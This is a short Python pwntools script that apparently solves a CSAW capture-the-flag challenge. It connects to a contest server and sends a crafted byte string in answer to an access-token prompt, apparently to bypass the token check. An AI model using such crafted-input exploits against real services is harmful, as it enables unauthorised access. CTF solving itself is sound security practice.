from pwn import *

r = remote("firewall.chal.csaw.io", 4141)

print r.recvuntil("| ENTER SERVICE ACCESS TOKEN:")

# r.sendline('\x00' + '\x10'*19)
r.sendline('\x31' + '\x0A'*19)
print r.recvline()